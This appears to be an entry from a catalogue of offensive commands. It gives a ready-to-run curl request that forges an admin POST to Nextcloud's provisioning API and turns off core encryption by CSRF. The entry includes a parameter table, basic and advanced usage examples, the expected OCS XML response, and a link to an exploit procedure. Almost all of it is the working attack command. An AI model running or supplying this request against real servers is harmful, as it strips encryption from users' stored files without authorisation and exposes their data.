---
data: >-
  curl -i -s -k -X $'POST' -H $'Host: <nextcloud_server>' -H $'Proxy-Connection:
  keep-alive' -H $'Content-Length: 10' -H $'Accept: _/_' -H $'Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8' -H $'OCS-APIREQUEST: true'
  -H $'Origin: http://<nextcloud_server>' -H $'User-Agent: Mozilla/5.0 (Windows
  NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96
  Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'requesttoken:
  sSxMouPIwzbpI5ErZycXzGqCsOzacYntRk18kUOwin4=:gBUhzYWys3qhEqNPFE1frx663pq9BdjaKiwz5zfo6y4='
  -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9 ' -H
  $'Cookie: <cookies>' --data-binary $'value=no\x0d\x0a'
  $'http://<nextcloud_server>/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled'
tags:
  - csrf
  - nextcloud
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.426Z'
id: 5e065a0b-3a0d-4cbb-9e95-5e37dc43b87b
verified: false
validated: true
submitted: true
---
# curl-disable-nextcloud-encryption

## Command

```bash
curl -i -s -k -X $'POST' -H $'Host: <nextcloud_server>' -H $'Proxy-Connection: keep-alive' -H $'Content-Length: 10' -H $'Accept: _/_' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'OCS-APIREQUEST: true' -H $'Origin: http://<nextcloud_server>' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'requesttoken: sSxMouPIwzbpI5ErZycXzGqCsOzacYntRk18kUOwin4=:gBUhzYWys3qhEqNPFE1frx663pq9BdjaKiwz5zfo6y4=' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9 ' -H $'Cookie: <cookies>' --data-binary $'value=no\x0d\x0a' $'http://<nextcloud_server>/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled'
```

## Description

This curl command sends a forged POST request to disable Nextcloud's core encryption setting via CSRF exploitation, using admin cookies to authenticate.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<nextcloud_server>` | Target Nextcloud server hostname or IP | Yes |
| `<cookies>` | Full Cookie header value from admin session | Yes |
| `requesttoken` | CSRF request token (example; may need session-specific) | Yes |
| `Content-Length: 10` | Length of POST data 'value=no\r\n' | Yes |
| `--data-binary $'value=no\x0d\x0a'` | Payload to set encryption to disabled | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X POST -H 'Host: example.com' -H 'Cookie: nc_session=abc123' --data-binary $'value=no\r\n' 'http://example.com/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled'
```

### Advanced Usage

Include full headers as shown in the command for realistic simulation.

## Expected Output

HTTP response with 200 OK status and XML body like:

<?xml version="1.0"?>
<ocs>
 <meta>
  <status>ok</status>
  <statuscode>100</statuscode>
  <message/>
 </meta>
 <data/>
</ocs>

## Related

- [[commands/curl-enable-nextcloud-encryption]]
- [[procedures/Exploit-CSRF-to-Disable-Nextcloud-Encryption]]
